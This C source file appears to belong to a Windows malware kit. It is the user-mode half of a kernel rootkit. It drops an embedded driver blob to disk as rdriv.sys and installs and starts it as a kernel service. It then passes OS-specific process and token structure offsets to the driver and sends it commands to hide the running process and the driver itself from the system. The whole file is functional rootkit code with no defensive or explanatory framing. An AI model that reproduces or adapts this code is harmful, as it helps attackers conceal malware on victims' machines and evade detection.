#include "includes.h"
#include "functions.h"
#include "ioctlcmd.h"
#include "fudll.h"

#ifndef NO_RDRIV

static BOOL Initialized = FALSE;
HANDLE gh_Device = INVALID_HANDLE_VALUE;

char ac_driverLabel[] = "rdriv";//dont change this unless u know
char ac_driverName[] = "rdriv.sys";//wtf u are doing

DWORD InitDriver()
{
	int iRetCode = ERROR_SUCCESS;
	HANDLE h_Device = INVALID_HANDLE_VALUE;
	DWORD  d_bytesRead, d_error;
	CHAR ac_driverPath[MAX_PATH];
	
    OSVERSIONINFOEX osvi;
    BOOL bOsVersionInfoEx;
	BOOL Found = FALSE;

	int  pid_offset = 0;
	int  flink_offset = 0;
	int  authid_offset = 0;
	int  token_offset = 0; 
	int  privcount_offset = 0;
	int  privaddr_offset  = 0;
	int  sidcount_offset = 0;
	int  sidaddr_offset  = 0;

	int  *os_offsets;

	try 
	{
		if (Initialized)
			return iRetCode;

		// Try calling GetVersionEx using the OSVERSIONINFOEX structure.
		// If that fails, try using the OSVERSIONINFO structure.
		ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

		if( !(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)) )
		{
			// If OSVERSIONINFOEX doesn't work, try OSVERSIONINFO.
			osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
			if (! GetVersionEx ( (OSVERSIONINFO *) &osvi) ) 
			return -1;
		}

		switch (osvi.dwPlatformId)
		{
			// Tests for Windows NT product family.
			case VER_PLATFORM_WIN32_NT:

			// Test for the product.
				if ( osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
				{
					//fprintf(stderr, "Microsoft Windows NT 4.0 ");
					pid_offset = 148;
					flink_offset = 152;
					authid_offset = 24;
					token_offset = 264; 
					privcount_offset = 52;
					privaddr_offset  = 80;
					sidcount_offset = 48;
					sidaddr_offset  = 72;

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && \
					      osvi.dwMinorVersion == 0 )
				{
					//fprintf(stderr, "Microsoft Windows 2000 ");
					pid_offset = 156;
					flink_offset = 160;
					authid_offset = 0x18;
					token_offset = 0x12c; 
					privcount_offset = 0x44;
					privaddr_offset  = 0x64;
					sidcount_offset = 0x3c;
					sidaddr_offset  = 0x58;

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1 )
				{
					//fprintf(stderr, "Microsoft Windows XP ");
					pid_offset = 132;
					flink_offset = 136;
					authid_offset = 24;
					token_offset = 200; 
					privcount_offset = 72;
					privaddr_offset  = 104;
					sidcount_offset = 64;
					sidaddr_offset  = 92;

					/* For Service Pack 2 Beta??
					privcount_offset = 84;
					privaddr_offset  = 116;
					sidcount_offset = 76;
					sidaddr_offset  = 104;
					*/

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2 )
				{
					//fprintf(stderr, "Microsoft Windows Server 2003 ");
					pid_offset = 132;
					flink_offset = 136;
					authid_offset = 24;
					token_offset = 200; 
					privcount_offset = 84;
					privaddr_offset  = 116;
					sidcount_offset = 76;
					sidaddr_offset  = 104;

					Found = TRUE;
				}

				// Display version, service pack (if any), and build number.
//				if ( osvi.dwMajorVersion <= 4 )
//				{
//					fprintf(stderr, "version %d.%d %s (Build %d)\n",
//					osvi.dwMajorVersion,
//					osvi.dwMinorVersion,
//					osvi.szCSDVersion,
//					osvi.dwBuildNumber & 0xFFFF);
//				}
//				else
//				{ 
//					fprintf(stderr, "%s (Build %d)\n",
//					osvi.szCSDVersion,
//					osvi.dwBuildNumber & 0xFFFF);
//				}
				break;

			default:
				//fprintf(stderr, "\nOperating System Version %d.%d Not Supported!\n", osvi.dwMajorVersion, osvi.dwMinorVersion); 
				return -1;
				break; // Never executed
		}
		if (!Found)
		{
			//fprintf(stderr, "\nOperating System Version %d.%d Not Supported!\n",
			//	osvi.dwMajorVersion,
			//	osvi.dwMinorVersion); 
			return -1;
		}
		else 
		{
			if (GetCurrentDirectory(MAX_PATH, ac_driverPath))
			{
				strncat(ac_driverPath, "\\", MAX_PATH-strlen(ac_driverPath));
				strncat(ac_driverPath, ac_driverName, MAX_PATH-strlen(ac_driverPath));
			}
			LoadDeviceDriver(ac_driverLabel, ac_driverPath ,&h_Device, &d_error);
			if (h_Device == INVALID_HANDLE_VALUE)
			{
				//fprintf(stderr, "Unable to Load Driver");
				throw d_error;
			}
			gh_Device = h_Device;


			os_offsets = (int *)calloc(1, sizeof(int)*8);
			if (!os_offsets)
			{
				//fprintf(stderr, "Memory allocation failed.\n");
				return -1;
			}

			memcpy(os_offsets, &pid_offset, sizeof(int));
			memcpy(os_offsets + 1, &flink_offset, sizeof(int));
			memcpy(os_offsets + 2, &authid_offset, sizeof(int));
			memcpy(os_offsets + 3, &token_offset, sizeof(int));
			memcpy(os_offsets + 4, &privcount_offset, sizeof(int));
			memcpy(os_offsets + 5, &privaddr_offset, sizeof(int));
			memcpy(os_offsets + 6, &sidcount_offset, sizeof(int));
			memcpy(os_offsets + 7, &sidaddr_offset, sizeof(int));

			if(!DeviceIoControl(gh_Device,
								IOCTL_ROOTKIT_INIT,
								os_offsets,
								sizeof(int)*8,
								NULL,
								0,
								&d_bytesRead,
								NULL))
			{
				//fprintf(stderr, "Error Initializing Driver with offsets.\n");
				throw;
			}
			if (os_offsets)
				free(os_offsets);
		}
	} catch (DWORD error) {
		error=0;//to get rid of the warning
      /*LPVOID lpMsgBuf = NULL;
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
					FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPTSTR) &lpMsgBuf, 0, NULL);
	  fprintf(stderr, "%s\n",lpMsgBuf);
	  if (lpMsgBuf)
		LocalFree(lpMsgBuf);*/

	  return -1;	
	} catch (...) {
      /*LPVOID lpMsgBuf = NULL;
	  DWORD error = 0;
      error = GetLastError();
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
					FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPTSTR) &lpMsgBuf, 0, NULL);
	  fprintf(stderr, "%s\n",lpMsgBuf);	
	  if (lpMsgBuf)
		LocalFree(lpMsgBuf);*/

      return -1;	
	}

	Initialized = TRUE;
	return (iRetCode);
} //InitDriver()

BOOL InitRK(void)
{
	DeleteFile(ac_driverName);
	unsigned long byteswritten;
	HANDLE FileHandle;
	FileHandle=CreateFile(ac_driverName,GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (FileHandle == INVALID_HANDLE_VALUE) 
		ExitThread(0); 
	WriteFile(FileHandle,ac_driverData,DSIZE,&byteswritten,0);
	CloseHandle(FileHandle);

	if (FileSize(ac_driverName)!=DSIZE)
	{
		DeleteFile(ac_driverName);
		return FALSE;
	}
	if (InitDriver() == -1)
		return FALSE;
	return TRUE;
}

DWORD HideProc(DWORD pid)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_HIDEME,
					(void *) &pid,
					sizeof(DWORD),
					NULL,
					0,
					&d_bytesRead,
					NULL);
	
	return success;	
}

BOOL HideMe(void)
{
	DWORD pstatus,dstatus;
	DWORD pid = GetCurrentProcessId();
	if (!Initialized)
		return FALSE;
	pstatus=HideProc(pid);
	dstatus=HideDriv(ac_driverName);
	if (pstatus == 0 || dstatus == 0)
		return FALSE;
	else
		return TRUE;
}

DWORD HideDriv(char *driver_name)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_HIDEDRIV,
					(void *) driver_name,
					(DWORD) strlen(driver_name),
					NULL,
					0,
					&d_bytesRead,
					NULL);
	
	return success;	
}




///////////////////////////////////////////////////////////////////////////////////////
// Filename Instdrv.cpp
// Date:    5/27/2003
// Version: 1.0
BOOL LoadDeviceDriver( const char * Name, const char * Path, 
					  HANDLE * lphDevice, PDWORD Error );
BOOL UnloadDeviceDriver( const char * Name );
BOOL InstallDriver( IN SC_HANDLE, IN LPCTSTR, IN LPCTSTR);
BOOL StartDriver( IN SC_HANDLE, IN LPCTSTR);
BOOL OpenDevice( IN LPCTSTR, HANDLE *);
BOOL StopDriver( IN SC_HANDLE, IN LPCTSTR);
BOOL RemoveDriver( IN SC_HANDLE, IN LPCTSTR);

/****************************************************************************
*    FUNCTION: InstallDriver( IN SC_HANDLE, IN LPCTSTR, IN LPCTSTR)
*    PURPOSE: Creates a driver service.
****************************************************************************/
BOOL InstallDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, IN LPCTSTR ServiceExe )
{
    SC_HANDLE  schService;

    //
    // NOTE: This creates an entry for a standalone driver. If this
    //       is modified for use with a driver that requires a Tag,
    //       Group, and/or Dependencies, it may be necessary to
    //       query the registry for existing driver information
    //       (in order to determine a unique Tag, etc.).
    //

    schService = fCreateService(SchSCManager,          // SCManager database
                                DriverName,            // name of service
                                DriverName,            // name to display
                                SERVICE_ALL_ACCESS,    // desired access
                                SERVICE_KERNEL_DRIVER, // service type
                                SERVICE_DEMAND_START,  // start type
                                SERVICE_ERROR_NORMAL,  // error control type
                                ServiceExe,            // service's binary
                                NULL,                  // no load ordering group
                                NULL,                  // no tag identifier
                                NULL,                  // no dependencies
                                NULL,                  // LocalSystem account
                                NULL                   // no password
                                );
    if ( schService == NULL )
        return FALSE;

    fCloseServiceHandle( schService );

    return TRUE;
}

/****************************************************************************
*    FUNCTION: StartDriver( IN SC_HANDLE, IN LPCTSTR)
*    PURPOSE: Starts the driver service.
****************************************************************************/
BOOL StartDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE  schService;
    BOOL       ret;

    schService = fOpenService( SchSCManager,
                              DriverName,
                              SERVICE_ALL_ACCESS
                              );
    if ( schService == NULL )
        return FALSE;

    ret = fStartService( schService, 0, NULL )
       || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING 
	   || GetLastError() == ERROR_SERVICE_DISABLED;

    fCloseServiceHandle( schService );
    return ret;
}

/****************************************************************************
*    FUNCTION: OpenDevice( IN LPCTSTR, HANDLE *)
*    PURPOSE: Opens the device and returns a handle if desired.
****************************************************************************/
BOOL OpenDevice( IN LPCTSTR DriverName, HANDLE * lphDevice )
{
    TCHAR    completeDeviceName[64];
    HANDLE   hDevice;

    //
    // Create a \\.\XXX device name that CreateFile can use
    //
    // NOTE: We're making an assumption here that the driver
    //       has created a symbolic link using it's own name
    //       (i.e. if the driver has the name "XXX" we assume
    //       that it used IoCreateSymbolicLink to create a
    //       symbolic link "\DosDevices\XXX". Usually, there
    //       is this understanding between related apps/drivers.
    //
    //       An application might also peruse the DEVICEMAP
    //       section of the registry, or use the QueryDosDevice
    //       API to enumerate the existing symbolic links in the
    //       system.
    //

	if( (GetVersion() & 0xFF) >= 5 ) {

		//
		// We reference the global name so that the application can
		// be executed in Terminal Services sessions on Win2K
		//
		wsprintf( completeDeviceName, TEXT("\\\\.\\Global\\%s"), DriverName );

	} else {

		wsprintf( completeDeviceName, TEXT("\\\\.\\%s"), DriverName );
	}

    hDevice = CreateFile( completeDeviceName,
                          GENERIC_READ | GENERIC_WRITE,
                          0,
                          NULL,
                          OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL,
                          NULL
                          );
    if ( hDevice == ((HANDLE)-1) )
        return FALSE;

	// If user wants handle, give it to them.  Otherwise, just close it.
	if ( lphDevice )
		*lphDevice = hDevice;
	else
	    CloseHandle( hDevice );

    return TRUE;
}

/****************************************************************************
*    FUNCTION: StopDriver( IN SC_HANDLE, IN LPCTSTR)
*    PURPOSE: Has the configuration manager stop the driver (unload it)
****************************************************************************/
BOOL StopDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE       schService;
    BOOL            ret;
    SERVICE_STATUS  serviceStatus;

    schService = fOpenService( SchSCManager, DriverName, SERVICE_ALL_ACCESS );
    if ( schService == NULL )
        return FALSE;

    ret = fControlService( schService, SERVICE_CONTROL_STOP, &serviceStatus );

    fCloseServiceHandle( schService );

    return ret;
}

/****************************************************************************
*    FUNCTION: RemoveDriver( IN SC_HANDLE, IN LPCTSTR)
*    PURPOSE: Deletes the driver service.
****************************************************************************/
BOOL RemoveDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE  schService;
    BOOL       ret;

    schService = fOpenService( SchSCManager,
                              DriverName,
                              SERVICE_ALL_ACCESS
                              );

    if ( schService == NULL )
        return FALSE;

    ret = fDeleteService( schService );
    fCloseServiceHandle( schService );
    return ret;
}

/****************************************************************************
*    FUNCTION: UnloadDeviceDriver( const TCHAR *)
*    PURPOSE: Stops the driver and has the configuration manager unload it.
****************************************************************************/
BOOL UnloadDeviceDriver( const TCHAR * Name )
{
	SC_HANDLE	schSCManager;

	schSCManager = fOpenSCManager(	NULL,                 // machine (NULL == local)
                              		NULL,                 // database (NULL == default)
									SC_MANAGER_ALL_ACCESS // access required
								);

	StopDriver( schSCManager, Name );
	RemoveDriver( schSCManager, Name );
	 
	fCloseServiceHandle( schSCManager );

	return TRUE;
}

/****************************************************************************
*    FUNCTION: LoadDeviceDriver( const TCHAR, const TCHAR, HANDLE *)
*    PURPOSE: Registers a driver with the system configuration manager 
*	 and then loads it.
****************************************************************************/
BOOL LoadDeviceDriver( const TCHAR * Name, const TCHAR * Path, 
					  HANDLE * lphDevice, PDWORD Error )
{
	SC_HANDLE	schSCManager;
	BOOL		okay;

	schSCManager = fOpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );

	// Remove old instances
	RemoveDriver( schSCManager, Name );

	// Ignore success of installation: it may already be installed.
	InstallDriver( schSCManager, Name, Path );

	// Ignore success of start: it may already be started.
	StartDriver( schSCManager, Name );

	// Do make sure we can open it.
	okay = OpenDevice( Name, lphDevice );
	*Error = GetLastError();
 	fCloseServiceHandle( schSCManager );

	return okay;
}

#endif